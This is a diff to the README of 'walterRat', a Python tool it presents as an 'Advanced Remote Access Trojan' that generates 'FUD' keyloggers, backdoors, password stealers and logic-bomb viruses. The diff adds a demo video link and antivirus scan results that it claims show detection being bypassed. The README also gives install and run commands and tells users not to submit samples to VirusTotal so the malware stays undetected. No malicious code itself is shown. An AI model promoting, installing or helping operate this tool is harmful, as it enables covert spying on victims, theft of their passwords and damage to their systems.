@@ -14,7 +14,10 @@ Advanced Remote Access Trojan Tool.
   ->You Can Generate Fud Keylogger
   
   ->You Can Generate Fud Logic Bomb Viruses
+# Video
+  ->English:https://www.youtube.com/watch?v=Mphy1URUPGk
   
+  ->Turkish:Soon
 # Installtion
   ->git clone https://github.com/AzizKpln/walterRat.git
   
@@ -24,5 +27,20 @@ Advanced Remote Access Trojan Tool.
   
 # Run
   ->python walterRat.py
+ 
+# Scan Results
+  ->BACKDOOR:https://antiscan.me/scan/new/result?id=QdGXbjd7t4Vd
+  
+  ->KEYLOGGER:https://antiscan.me/scan/new/result?id=2yomWarPk8fl
+  
+  ->PASSWORD STEALER:https://antiscan.me/scan/new/result?id=kWZCM2z2xPHL
+  
+  ->ALL THE LOGIC BOMB VIRUSES:https://antiscan.me/scan/new/result?id=ZCKGYhUZhXas
+  
+  NOTE1:Nod32 says 'Archive Damaged' but it is not warning of a virus.It is due to python2.Program is converting the 
+                extension to exe from  linux.Therefore nod32 says archive damaged,but actually it is bypassed.
+                
+  NOTE2:No one uses Zillya :)
+  
 
 # DO NOT SCAN THE FILES TO VIRUSTOTAL OR ANY ONLINE VIRUS SCANNER
